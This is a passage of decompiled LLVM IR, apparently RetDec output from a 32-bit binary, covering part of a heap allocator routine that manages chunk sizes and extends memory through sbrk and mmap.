  %v0_8050537 = phi i32 [ %v4_8050504, %dec_label_pc_805050f ], [ %v1_80504f2, %dec_label_pc_80504f6.dec_label_pc_8050526.preheader_crit_edge ]
  %v2_80505264 = and i32 %v0_8050537, %esi.promoted
  %v3_80505265 = icmp eq i32 %v2_80505264, 0
  br i1 %v3_80505265, label %dec_label_pc_8050521, label %dec_label_pc_805052a

dec_label_pc_8050521:                             ; preds = %dec_label_pc_8050526.preheader, %dec_label_pc_8050521
  %v2_805052414 = phi i32 [ %v2_8050524, %dec_label_pc_8050521 ], [ %esi.promoted, %dec_label_pc_8050526.preheader ]
  %v0_805052113 = phi i32 [ %v1_8050521, %dec_label_pc_8050521 ], [ %v0_805052112, %dec_label_pc_8050526.preheader ]
  %v1_8050521 = add i32 %v0_805052113, 8
  %v2_8050524 = mul i32 %v2_805052414, 2
  %v2_8050526 = and i32 %v2_8050524, %v0_8050537
  %v3_8050526 = icmp eq i32 %v2_8050526, 0
  br i1 %v3_8050526, label %dec_label_pc_8050521, label %dec_label_pc_8050526.dec_label_pc_805052a_crit_edge

dec_label_pc_8050526.dec_label_pc_805052a_crit_edge: ; preds = %dec_label_pc_8050521
  store i32 %v1_8050521, i32* %ebx.global-to-local, align 4
  store i32 %v2_8050524, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805052a

dec_label_pc_805052a:                             ; preds = %dec_label_pc_8050526.dec_label_pc_805052a_crit_edge, %dec_label_pc_8050526.preheader
  %v0_8050531 = phi i32 [ %v2_8050524, %dec_label_pc_8050526.dec_label_pc_805052a_crit_edge ], [ %esi.promoted, %dec_label_pc_8050526.preheader ]
  %v1_8050554 = phi i32 [ %v1_8050521, %dec_label_pc_8050526.dec_label_pc_805052a_crit_edge ], [ %v0_805052112, %dec_label_pc_8050526.preheader ]
  %v1_805052a = add i32 %v1_8050554, 12
  %v2_805052a = inttoptr i32 %v1_805052a to i32*
  %v3_805052a = load i32, i32* %v2_805052a, align 4
  store i32 %v3_805052a, i32* @ecx, align 4
  %v12_805052d = icmp eq i32 %v3_805052a, %v1_8050554
  %v1_805052f = icmp eq i1 %v12_805052d, false
  br i1 %v1_805052f, label %dec_label_pc_8050545, label %dec_label_pc_8050531

dec_label_pc_8050531:                             ; preds = %dec_label_pc_805052a
  %v2_8050533 = mul i32 %v0_8050531, 2
  store i32 %v2_8050533, i32* %esi.global-to-local, align 4
  %v1_8050535 = sub i32 -1, %v0_8050531
  store i32 %v1_8050535, i32* %eax.global-to-local, align 4
  %v2_8050537 = and i32 %v0_8050537, %v1_8050535
  store i32 %v2_8050537, i32* %edx.global-to-local, align 4
  %v1_8050539 = add i32 %v3_805052a, 8
  store i32 %v1_8050539, i32* %ebx.global-to-local, align 4
  %v1_805053c = load i32, i32* @edi, align 4
  %v2_805053c = mul i32 %v1_805053c, 4
  %v3_805053c = add i32 %v2_805053c, ptrtoint (i32* @global_var_80606d4.193 to i32)
  %v4_805053c = inttoptr i32 %v3_805053c to i32*
  store i32 %v2_8050537, i32* %v4_805053c, align 4
  %v0_80504f2.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80504f2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050545:                             ; preds = %dec_label_pc_805052a
  %v1_8050545 = add i32 %v3_805052a, 4
  %v2_8050545 = inttoptr i32 %v1_8050545 to i32*
  %v3_8050545 = load i32, i32* %v2_8050545, align 4
  store i32 %v3_8050545, i32* %edx.global-to-local, align 4
  %v1_8050548 = add i32 %v3_805052a, 12
  %v2_8050548 = inttoptr i32 %v1_8050548 to i32*
  %v3_8050548 = load i32, i32* %v2_8050548, align 4
  store i32 %v3_8050548, i32* %eax.global-to-local, align 4
  %v1_805054b = and i32 %v3_8050545, -4
  store i32 %v1_805054b, i32* @edx, align 4
  %v5_8050550 = sub i32 %v1_805054b, %v1_805064a
  store i32 %v5_8050550, i32* %esi.global-to-local, align 4
  store i32 %v3_8050548, i32* %v2_805052a, align 4
  %v0_8050557 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050557 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050557 = add i32 %v1_8050557, 8
  %v3_8050557 = inttoptr i32 %v2_8050557 to i32*
  store i32 %v0_8050557, i32* %v3_8050557, align 4
  %v0_805055a = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_805055a, 16
  %v0_805055f = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_805055f, label %dec_label_pc_8050566

dec_label_pc_805055f:                             ; preds = %dec_label_pc_8050545
  %v1_805055f = load i32, i32* @edx, align 4
  %v2_805055f = add i32 %v0_805055f, 4
  %v3_805055f = add i32 %v2_805055f, %v1_805055f
  %v4_805055f = inttoptr i32 %v3_805055f to i32*
  %v5_805055f = load i32, i32* %v4_805055f, align 4
  %v6_805055f = or i32 %v5_805055f, 1
  store i32 %v6_805055f, i32* %v4_805055f, align 4
  br label %dec_label_pc_80505ad

dec_label_pc_8050566:                             ; preds = %dec_label_pc_8050545
  %v2_805056a = add i32 %v0_805055f, %v1_805064a
  store i32 %v2_805056a, i32* %eax.global-to-local, align 4
  %v1_8050573 = load i32, i32* @ebp, align 4
  %v2_8050573 = add i32 %v1_8050573, 8
  %v3_8050573 = inttoptr i32 %v2_8050573 to i32*
  store i32 %v2_805056a, i32* %v3_8050573, align 4
  %v0_8050576 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050576 = load i32, i32* @ebp, align 4
  %v2_8050576 = add i32 %v1_8050576, 12
  %v3_8050576 = inttoptr i32 %v2_8050576 to i32*
  store i32 %v0_8050576, i32* %v3_8050576, align 4
  %v0_8050579 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050579 = add i32 %v0_8050579, 8
  %v2_8050579 = inttoptr i32 %v1_8050579 to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v2_8050579, align 4
  %v0_8050580 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050580 = add i32 %v0_8050580, 12
  %v2_8050580 = inttoptr i32 %v1_8050580 to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v2_8050580, align 4
  %v0_8050587 = load i32, i32* @global_var_80603d0.190, align 16
  %v4_805058d = load i32, i32* %eax.global-to-local, align 4
  %v5_805058d = select i1 %v8_80502f3, i32 %v4_805058d, i32 %v0_8050587
  %v4_8050590 = or i32 %v1_805064a, 1
  store i32 %v5_805058d, i32* @global_var_80603d0.190, align 16
  %v0_805059b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8050590, i32* %ebx.global-to-local, align 4
  %v1_80505a1 = or i32 %v0_805059b, 1
  store i32 %v1_80505a1, i32* @edx, align 4
  %v3_80505a4 = add i32 %v0_805059b, %v4_805058d
  %v4_80505a4 = inttoptr i32 %v3_80505a4 to i32*
  store i32 %v0_805059b, i32* %v4_80505a4, align 4
  %v0_80505a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80505a7 = load i32, i32* @ecx, align 4
  %v2_80505a7 = add i32 %v1_80505a7, 4
  %v3_80505a7 = inttoptr i32 %v2_80505a7 to i32*
  store i32 %v0_80505a7, i32* %v3_80505a7, align 4
  %v0_80505aa = load i32, i32* @edx, align 4
  %v1_80505aa = load i32, i32* %eax.global-to-local, align 4
  %v2_80505aa = add i32 %v1_80505aa, 4
  %v3_80505aa = inttoptr i32 %v2_80505aa to i32*
  store i32 %v0_80505aa, i32* %v3_80505aa, align 4
  br label %dec_label_pc_80505ad

dec_label_pc_80505ad:                             ; preds = %dec_label_pc_80506a1, %dec_label_pc_805055f, %dec_label_pc_8050566
  %v0_80505ad = load i32, i32* @ecx, align 4
  %v1_80505ad = add i32 %v0_80505ad, 8
  store i32 %v1_80505ad, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80509d5

dec_label_pc_80505b5.loopexit:                    ; preds = %dec_label_pc_80504fa
  br label %dec_label_pc_80505b5

dec_label_pc_80505b5:                             ; preds = %dec_label_pc_80505b5.loopexit, %dec_label_pc_80502b5, %dec_label_pc_80502bd
  %v0_80505b5 = load i32, i32* @global_var_80603cc.189, align 4
  store i32 %v0_80505b5, i32* @ebx, align 4
  store i32 %v1_805064a, i32* %esi.global-to-local, align 4
  %v1_80505bf = add i32 %v0_80505b5, 4
  %v2_80505bf = inttoptr i32 %v1_80505bf to i32*
  %v3_80505bf = load i32, i32* %v2_80505bf, align 4
  %v1_80505c2 = add i32 %v1_805064a, 16
  store i32 %v1_80505c2, i32* @esi, align 4
  %v1_80505c9 = and i32 %v3_80505bf, -4
  store i32 %v1_80505c9, i32* %ecx.global-to-local, align 4
  %v7_80505cc = icmp ult i32 %v1_80505c9, %v1_80505c2
  br i1 %v7_80505cc, label %dec_label_pc_80505ec, label %dec_label_pc_80505d0

dec_label_pc_80505d0:                             ; preds = %dec_label_pc_80505b5
  %v2_80505d4 = add i32 %v0_80505b5, %v1_805064a
  store i32 %v2_80505d4, i32* @edx, align 4
  %v1_80505d7 = or i32 %v1_805064a, 1
  store i32 %v1_80505d7, i32* %eax.global-to-local, align 4
  store i32 %v2_80505d4, i32* @global_var_80603cc.189, align 4
  store i32 %v1_80505d7, i32* %v2_80505bf, align 4
  %v0_80505e3 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80505e3 = sub i32 %v0_80505e3, %v1_805064a
  store i32 %v5_80505e3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050965

dec_label_pc_80505ec:                             ; preds = %dec_label_pc_80505b5
  %v0_80505ec = load i8, i8* @global_var_80603a0.188, align 32
  %v1_80505ec = and i8 %v0_80505ec, 2
  %v2_80505ec = icmp eq i8 %v1_80505ec, 0
  %v0_80505f3 = load i32, i32* @global_var_80606fc.194, align 4
  store i32 %v0_80505f3, i32* %edx.global-to-local, align 4
  br i1 %v2_80505ec, label %dec_label_pc_8050620, label %dec_label_pc_80505fb

dec_label_pc_80505fb:                             ; preds = %dec_label_pc_80505ec
  store i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32* %stack_var_-92, align 4
  %v2_8050603 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80603a0.188 to i32*))
  store i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32* @ebx, align 4
  %v1_805060d = add i32 %v1_805064a, -7
  store i32 %v1_805060d, i32* %eax.global-to-local, align 4
  store i32 %v1_805060d, i32* %stack_var_-92, align 4
  %v1_8050611 = call i32 @malloc(i32 %v1_805060d)
  store i32 %v1_8050611, i32* %eax.global-to-local, align 4
  store i32 %v1_8050611, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80509d5

dec_label_pc_8050620:                             ; preds = %dec_label_pc_80505ec
  store i32 %v1_805064a, i32* @ebx, align 4
  %v1_8050624 = add i32 %v0_80505f3, -1
  store i32 %v1_8050624, i32* @ecx, align 4
  %v1_8050627 = load i32, i32* @global_var_80606ec.195, align 4
  %v7_8050627 = icmp ult i32 %v1_805064a, %v1_8050627
  br i1 %v7_8050627, label %dec_label_pc_8050702, label %dec_label_pc_8050637

dec_label_pc_8050637:                             ; preds = %dec_label_pc_8050620
  %v0_8050637 = load i32, i32* @global_var_80606f0.196, align 16
  store i32 %v0_8050637, i32* %eax.global-to-local, align 4
  %v1_805063c = load i32, i32* @global_var_80606f4.197, align 4
  %v5_8050642 = icmp slt i32 %v0_8050637, %v1_805063c
  br i1 %v5_8050642, label %dec_label_pc_8050648, label %dec_label_pc_8050702

dec_label_pc_8050648:                             ; preds = %dec_label_pc_8050637
  %v2_805064a = add i32 %v1_805064a, 10
  %v3_805064a = add i32 %v2_805064a, %v0_80505f3
  %v1_805064e = sub i32 0, %v0_80505f3
  store i32 %v1_805064e, i32* %eax.global-to-local, align 4
  %v2_8050650 = and i32 %v3_805064a, %v1_805064e
  store i32 %v2_8050650, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8050650, %v1_805064a
  br i1 %tmp139, label %dec_label_pc_805065c, label %dec_label_pc_8050702

dec_label_pc_805065c:                             ; preds = %dec_label_pc_8050648
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050669 = call i32 @mmap(i32 0, i32 %v2_8050650, i32 3, i32 34, i32 0, i32 0, i32 %v1_8050624, i32 %v1_8050624)
  store i32 %v8_8050669, i32* %eax.global-to-local, align 4
  %v10_8050671 = icmp eq i32 %v8_8050669, -1
  store i32 %v8_8050669, i32* %edx.global-to-local, align 4
  br i1 %v10_8050671, label %dec_label_pc_805065c.dec_label_pc_8050702_crit_edge, label %dec_label_pc_805067c

dec_label_pc_805065c.dec_label_pc_8050702_crit_edge: ; preds = %dec_label_pc_805065c
  %v0_8050702.pre = load i32, i32* @global_var_80603cc.189, align 4
  br label %dec_label_pc_8050702

dec_label_pc_805067c:                             ; preds = %dec_label_pc_805065c
  %v1_805067e = urem i32 %v8_8050669, 8
  %v2_805067e = icmp eq i32 %v1_805067e, 0
  store i32 %v1_805067e, i32* %ecx.global-to-local, align 4
  br i1 %v2_805067e, label %dec_label_pc_8050697, label %dec_label_pc_8050683

dec_label_pc_8050683:                             ; preds = %dec_label_pc_805067c
  %v0_8050688 = load i32, i32* @ebx, align 4
  %v2_805068a = sub nsw i32 8, %v1_805067e
  store i32 %v2_805068a, i32* %eax.global-to-local, align 4
  %v2_805068c = add i32 %v2_805068a, %v8_8050669
  store i32 %v2_805068c, i32* @ecx, align 4
  %v2_805068f = sub i32 %v0_8050688, %v2_805068a
  store i32 %v2_805068f, i32* %esi.global-to-local, align 4
  %v2_8050691 = inttoptr i32 %v2_805068c to i32*
  store i32 %v2_805068a, i32* %v2_8050691, align 4
  br label %dec_label_pc_80506a1

dec_label_pc_8050697:                             ; preds = %dec_label_pc_805067c
  store i32 %v8_8050669, i32* @ecx, align 4
  %v1_8050699 = inttoptr i32 %v8_8050669 to i32*
  store i32 0, i32* %v1_8050699, align 4
  br label %dec_label_pc_80506a1

dec_label_pc_80506a1:                             ; preds = %dec_label_pc_8050683, %dec_label_pc_8050697
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050683 ], [ @ebx, %dec_label_pc_8050697 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_80506a1 = or i32 %storemerge, 2
  %v1_80506a4 = load i32, i32* @ecx, align 4
  %v2_80506a4 = add i32 %v1_80506a4, 4
  %v3_80506a4 = inttoptr i32 %v2_80506a4 to i32*
  store i32 %v1_80506a1, i32* %v3_80506a4, align 4
  %v0_80506a7 = load i32, i32* @global_var_80606f0.196, align 16
  %v0_80506ac = load i32, i32* @global_var_8060710.198, align 16
  %v1_80506b2 = add i32 %v0_80506a7, 1
  %v1_80506b3 = load i32, i32* @global_var_80606f8.199, align 8
  %v2_80506b3 = sub i32 %v1_80506b2, %v1_80506b3
  %v8_80506b3 = xor i32 %v1_80506b3, %v1_80506b2
  %v9_80506b3 = xor i32 %v2_80506b3, %v1_80506b2
  %v10_80506b3 = and i32 %v9_80506b3, %v8_80506b3
  %v11_80506b3 = icmp slt i32 %v10_80506b3, 0
  %v12_80506b3 = icmp eq i32 %v2_80506b3, 0
  %v13_80506b3 = icmp slt i32 %v2_80506b3, 0
  store i32 %v1_80506b2, i32* @global_var_80606f0.196, align 16
  %v3_80506be = icmp ne i1 %v13_80506b3, %v11_80506b3
  %v4_80506be = or i1 %v12_80506b3, %v3_80506be
  %v7_80506be = select i1 %v4_80506be, i32 %v1_80506b3, i32 %v1_80506b2
  store i32 %v7_80506be, i32* @global_var_80606f8.199, align 8
  %v0_80506ca = load i32, i32* @global_var_8060704.200, align 4
  %v1_80506cf = load i32, i32* @ebx, align 4
  %v2_80506cf = add i32 %v1_80506cf, %v0_80506ca
  store i32 %v2_80506cf, i32* @global_var_8060704.200, align 4
  %tmp86 = icmp ule i32 %v2_80506cf, %v0_80506ac
  %v5_80506dc = select i1 %tmp86, i32 %v0_80506ac, i32 %v2_80506cf
  store i32 %v5_80506dc, i32* @edx, align 4
  %v1_80506df = load i32, i32* @global_var_8060708.201, align 8
  %v2_80506df = add i32 %v1_80506df, %v2_80506cf
  store i32 %v5_80506dc, i32* @global_var_8060710.198, align 16
  %v1_80506eb = load i32, i32* @global_var_8060714.202, align 4
  %tmp140 = icmp ule i32 %v2_80506df, %v1_80506eb
  %v5_80506f1 = select i1 %tmp140, i32 %v1_80506eb, i32 %v2_80506df
  store i32 %v5_80506f1, i32* %eax.global-to-local, align 4
  store i32 %v5_80506f1, i32* @global_var_8060714.202, align 4
  br label %dec_label_pc_80505ad

dec_label_pc_8050702:                             ; preds = %dec_label_pc_8050648, %dec_label_pc_805065c.dec_label_pc_8050702_crit_edge, %dec_label_pc_8050637, %dec_label_pc_8050620
  %v0_8050702 = phi i32 [ %v0_8050702.pre, %dec_label_pc_805065c.dec_label_pc_8050702_crit_edge ], [ %v0_80505b5, %dec_label_pc_8050637 ], [ %v0_80505b5, %dec_label_pc_8050648 ], [ %v0_80505b5, %dec_label_pc_8050620 ]
  store i32 %v0_8050702, i32* %eax.global-to-local, align 4
  %v1_805070b = add i32 %v0_8050702, 4
  %v2_805070b = inttoptr i32 %v1_805070b to i32*
  %v3_805070b = load i32, i32* %v2_805070b, align 4
  %v1_8050712 = and i32 %v3_805070b, -4
  %v2_8050712 = icmp eq i32 %v1_8050712, 0
  store i32 %v1_8050712, i32* @ebp, align 4
  %v1_8050718 = load i32, i32* @global_var_80606e8.203, align 8
  %v0_8050722 = load i8, i8* @global_var_8060700.204, align 256
  %v1_8050722 = urem i8 %v0_8050722, 2
  %v2_8050722 = icmp eq i8 %v1_8050722, 0
  %v1_8050729 = icmp eq i1 %v2_8050722, false
  %v1_8050712.op = sub i32 0, %v1_8050712
  %v2_8050720.neg = select i1 %v1_8050729, i32 %v1_8050712.op, i32 0
  %v2_8050718 = add i32 %v1_8050624, %v1_80505c2
  %v4_8050729 = add i32 %v2_8050718, %v1_8050718
  %v5_8050730 = add i32 %v4_8050729, %v2_8050720.neg
  store i32 %v5_8050730, i32* %eax.global-to-local, align 4
  %v1_8050734 = sub i32 0, %v0_80505f3
  store i32 %v1_8050734, i32* @edx, align 4
  %v2_8050738 = and i32 %v5_8050730, %v1_8050734
  store i32 %v2_8050738, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_8050738, 1
  br i1 %tmp87, label %dec_label_pc_8050756, label %dec_label_pc_8050740

dec_label_pc_8050740:                             ; preds = %dec_label_pc_8050702
  store i32 %v2_8050738, i32* %stack_var_-92, align 4
  %v1_8050744 = call i32 @__GI_sbrk(i32 %v2_8050738)
  store i32 %v1_8050744, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_805074f = icmp eq i32 %v1_8050744, -1
  store i32 %v1_8050744, i32* @ebx, align 4
  %v1_8050754 = icmp eq i1 %v10_805074f, false
  br i1 %v1_8050754, label %dec_label_pc_80507ad, label %dec_label_pc_8050740.dec_label_pc_8050756_crit_edge

dec_label_pc_8050740.dec_label_pc_8050756_crit_edge: ; preds = %dec_label_pc_8050740
  %v0_8050756.pre = load i8, i8* @global_var_8060700.204, align 256
  br label %dec_label_pc_8050756

dec_label_pc_8050756:                             ; preds = %dec_label_pc_8050740.dec_label_pc_8050756_crit_edge, %dec_label_pc_8050702
  %v0_8050783 = phi i32 [ -1, %dec_label_pc_8050740.dec_label_pc_8050756_crit_edge ], [ %v1_8050734, %dec_label_pc_8050702 ]
  %v0_8050756 = phi i8 [ %v0_8050756.pre, %dec_label_pc_8050740.dec_label_pc_8050756_crit_edge ], [ %v0_8050722, %dec_label_pc_8050702 ]
  %v1_8050756 = urem i8 %v0_8050756, 2
  %v2_8050756 = icmp eq i8 %v1_8050756, 0
  br i1 %v2_8050756, label %dec_label_pc_8050756.dec_label_pc_805076b_crit_edge, label %dec_label_pc_805075f

dec_label_pc_8050756.dec_label_pc_805076b_crit_edge: ; preds = %dec_label_pc_8050756
  %v0_805076b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805076b

dec_label_pc_805075f:                             ; preds = %dec_label_pc_8050756
  %v2_8050763 = add i32 %v1_8050712, %v1_8050624
  store i32 %v2_8050763, i32* %eax.global-to-local, align 4
  %v0_8050765 = load i32, i32* @esi, align 4
  %v2_8050765 = add i32 %v0_8050765, %v2_8050763
  %v5_8050767 = and i32 %v2_8050765, %v1_8050734
  store i32 %v5_8050767, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805076b

dec_label_pc_805076b:                             ; preds = %dec_label_pc_8050756.dec_label_pc_805076b_crit_edge, %dec_label_pc_805075f
  %v3_8050776 = phi i32 [ %v0_805076b.pre, %dec_label_pc_8050756.dec_label_pc_805076b_crit_edge ], [ %v5_8050767, %dec_label_pc_805075f ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8050776, 1048576
  %v5_8050776 = select i1 %tmp88, i32 1048576, i32 %v3_8050776
  store i32 %v5_8050776, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_8050776, %v1_805064a
  br i1 %tmp141, label %dec_label_pc_8050783, label %dec_label_pc_80509c8

dec_label_pc_8050783:                             ; preds = %dec_label_pc_805076b
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050790 = call i32 @mmap(i32 0, i32 %v5_8050776, i32 3, i32 34, i32 0, i32 0, i32 %v0_8050783, i32 %v0_8050783)
  store i32 %v8_8050790, i32* %eax.global-to-local, align 4
  %v10_8050798 = icmp eq i32 %v8_8050790, -1
  store i32 %v8_8050790, i32* @ebx, align 4
  br i1 %v10_8050798, label %dec_label_pc_80509c8, label %dec_label_pc_80507a3

dec_label_pc_80507a3:                             ; preds = %dec_label_pc_8050783
  %v0_80507a3 = load i8, i8* @global_var_8060700.204, align 1
  %v2_80507a3 = and i8 %v0_80507a3, -2
  store i8 %v2_80507a3, i8* @global_var_8060700.204, align 256
  %v1_80507aa = load i32, i32* @esi, align 4
  %v2_80507aa = add i32 %v1_80507aa, %v8_8050790
  store i32 %v2_80507aa, i32* @edx, align 4
  br label %dec_label_pc_80507ad

dec_label_pc_80507ad:                             ; preds = %dec_label_pc_8050740, %dec_label_pc_80507a3
  %v0_8050874 = phi i32 [ -1, %dec_label_pc_8050740 ], [ %v2_80507aa, %dec_label_pc_80507a3 ]
  %v0_8050882 = phi i32 [ %v1_8050744, %dec_label_pc_8050740 ], [ %v8_8050790, %dec_label_pc_80507a3 ]
  %v10_80507ad = icmp eq i32 %v0_8050882, -1
  br i1 %v10_80507ad, label %dec_label_pc_80509c8, label %dec_label_pc_80507b6

dec_label_pc_80507b6:                             ; preds = %dec_label_pc_80507ad
  %v0_80507ba = load i32, i32* @global_var_8060708.201, align 8
  %v1_80507ba = load i32, i32* @esi, align 4
  %v2_80507ba = add i32 %v1_80507ba, %v0_80507ba
  store i32 %v2_80507ba, i32* @global_var_8060708.201, align 8
  %v2_80507c0 = add i32 %v1_8050712, %v0_8050702
  store i32 %v2_80507c0, i32* %ecx.global-to-local, align 4
  %v2_80507c2 = sub i32 %v0_8050882, %v2_80507c0
  %v7_80507c2 = icmp ult i32 %v0_8050882, %v2_80507c0
  %v12_80507c2 = icmp eq i32 %v2_80507c2, 0
  %v1_80507c4 = icmp eq i1 %v12_80507c2, false
  br i1 %v1_80507c4, label %dec_label_pc_80507dd, label %dec_label_pc_80507c6

dec_label_pc_80507c6:                             ; preds = %dec_label_pc_80507b6
  %v10_80507c6 = icmp eq i32 %v0_8050874, -1
  %v1_80507c9 = icmp eq i1 %v10_80507c6, false
  br i1 %v1_80507c9, label %dec_label_pc_80507dd, label %dec_label_pc_80507cb

dec_label_pc_80507cb:                             ; preds = %dec_label_pc_80507c6
  store i32 %v0_8050702, i32* %ecx.global-to-local, align 4
  %v2_80507cf = add i32 %v1_80507ba, %v1_8050712
  %v1_80507d2 = or i32 %v2_80507cf, 1
  store i32 %v1_80507d2, i32* %eax.global-to-local, align 4
  store i32 %v1_80507d2, i32* %v2_805070b, align 4
  br label %dec_label_pc_805090a

dec_label_pc_80507dd:                             ; preds = %dec_label_pc_80507c6, %dec_label_pc_80507b6
  %v0_80507dd = load i8, i8* @global_var_8060700.204, align 1
  %v1_80507dd = sext i8 %v0_80507dd to i32
  store i32 %v1_80507dd, i32* %eax.global-to-local, align 4
  %v2_80507e2 = urem i8 %v0_80507dd, 2
  %v3_80507e2 = icmp eq i8 %v2_80507e2, 0
  br i1 %v3_80507e2, label %dec_label_pc_80507f6, label %dec_label_pc_80507e6

dec_label_pc_80507e6:                             ; preds = %dec_label_pc_80507dd
  br i1 %v2_8050712, label %dec_label_pc_80507f6, label %dec_label_pc_80507ea

dec_label_pc_80507ea:                             ; preds = %dec_label_pc_80507e6
  %v1_80507ec = icmp eq i1 %v7_80507c2, false
  br i1 %v1_80507ec, label %dec_label_pc_80507f6, label %dec_label_pc_80507ee

dec_label_pc_80507ee:                             ; preds = %dec_label_pc_80507ea
  %v1_80507ee = and i32 %v1_80507dd, -2
  %v4_80507ee = trunc i32 %v1_80507ee to i8
  store i32 %v1_80507ee, i32* %eax.global-to-local, align 4
  store i8 %v4_80507ee, i8* @global_var_8060700.204, align 256
  br label %dec_label_pc_80507f6

dec_label_pc_80507f6:                             ; preds = %dec_label_pc_80507ea, %dec_label_pc_80507e6, %dec_label_pc_80507dd, %dec_label_pc_80507ee
  %v0_80507f6 = phi i8 [ %v0_80507dd, %dec_label_pc_80507ea ], [ %v0_80507dd, %dec_label_pc_80507e6 ], [ %v0_80507dd, %dec_label_pc_80507dd ], [ %v4_80507ee, %dec_label_pc_80507ee ]
  %v1_80507f6 = urem i8 %v0_80507f6, 2
  %v2_80507f6 = icmp eq i8 %v1_80507f6, 0
  br i1 %v2_80507f6, label %dec_label_pc_8050874, label %dec_label_pc_80507ff

dec_label_pc_80507ff:                             ; preds = %dec_label_pc_80507f6
  br i1 %v2_8050712, label %dec_label_pc_805080d, label %dec_label_pc_8050803

dec_label_pc_8050803:                             ; preds = %dec_label_pc_80507ff
  store i32 %v2_80507c2, i32* %eax.global-to-local, align 4
  %v2_8050807 = add i32 %v2_80507ba, %v2_80507c2
  store i32 %v2_8050807, i32* @global_var_8060708.201, align 8
  br label %dec_label_pc_805080d

dec_label_pc_805080d:                             ; preds = %dec_label_pc_80507ff, %dec_label_pc_8050803
  %v1_805080f = urem i32 %v0_8050882, 8
  %v2_805080f = icmp eq i32 %v1_805080f, 0
  store i32 %v1_805080f, i32* %edx.global-to-local, align 4
  %v1_8050812 = icmp eq i1 %v2_805080f, false
  br i1 %v1_8050812, label %dec_label_pc_805081a, label %dec_label_pc_8050814

dec_label_pc_8050814:                             ; preds = %dec_label_pc_805080d
  store i32 %v0_8050882, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050824

dec_label_pc_805081a:                             ; preds = %dec_label_pc_805080d
  %v2_805081f = sub nsw i32 8, %v1_805080f
  store i32 %v2_805081f, i32* %eax.global-to-local, align 4
  %v2_8050821 = add i32 %v2_805081f, %v0_8050882
  store i32 %v2_8050821, i32* @edi, align 4
  br label %dec_label_pc_8050824

dec_label_pc_8050824:                             ; preds = %dec_label_pc_8050814, %dec_label_pc_805081a
  %v0_8050831 = phi i32 [ 0, %dec_label_pc_8050814 ], [ %v2_805081f, %dec_label_pc_805081a ]
  %v2_8050824 = add i32 %v1_80507ba, %v0_8050882
  %v2_8050831 = add i32 %v0_8050831, %v1_8050712
  store i32 %v2_8050831, i32* %ecx.global-to-local, align 4
  %v2_8050834 = add i32 %v2_8050831, %v2_8050824
  store i32 %v2_8050834, i32* %edx.global-to-local, align 4
  %v2_8050836 = add i32 %v2_8050834, %v1_8050624
  %v5_8050839 = and i32 %v2_8050836, %v1_8050734
  %v2_8050840 = sub i32 %v5_8050839, %v2_8050834
  store i32 %v2_8050840, i32* %eax.global-to-local, align 4
  %v2_8050842 = add i32 %v2_8050840, %v2_8050831
  store i32 %v2_8050842, i32* @esi, align 4
  store i32 %v2_8050842, i32* %stack_var_-92, align 4
  %v1_8050846 = call i32 @__GI_sbrk(i32 %v2_8050842)
  store i32 %v1_8050846, i32* %eax.global-to-local, align 4
  %v10_805084e = icmp eq i32 %v1_8050846, -1
  store i32 %v1_8050846, i32* %edx.global-to-local, align 4
  %v1_8050853 = icmp eq i1 %v10_805084e, false
  br i1 %v1_8050853, label %dec_label_pc_8050863, label %dec_label_pc_8050855

dec_label_pc_8050855:                             ; preds = %dec_label_pc_8050824
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805085a = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805085a, i32* %eax.global-to-local, align 4
  store i32 %v1_805085a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050897

dec_label_pc_8050863:                             ; preds = %dec_label_pc_8050824
  %v1_8050863 = load i32, i32* @ebx, align 4
  %v7_8050863 = icmp ult i32 %v1_8050846, %v1_8050863
  %v1_8050865 = icmp eq i1 %v7_8050863, false
  br i1 %v1_8050865, label %dec_label_pc_805089c, label %dec_label_pc_8050867

dec_label_pc_8050867:                             ; preds = %dec_label_pc_8050863
  %v0_8050867 = load i8, i8* @global_var_8060700.204, align 1
  %v2_8050867 = and i8 %v0_8050867, -2
  store i8 %v2_8050867, i8* @global_var_8060700.204, align 256
  store i32 %v2_8050824, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805087b

dec_label_pc_8050874:                             ; preds = %dec_label_pc_80507f6
  %v10_8050874 = icmp eq i32 %v0_8050874, -1
  br i1 %v10_8050874, label %dec_label_pc_805087f, label %dec_label_pc_8050879

dec_label_pc_8050879:                             ; preds = %dec_label_pc_8050874
  store i32 %v0_8050882, i32* @edi, align 4
  br label %dec_label_pc_805087b

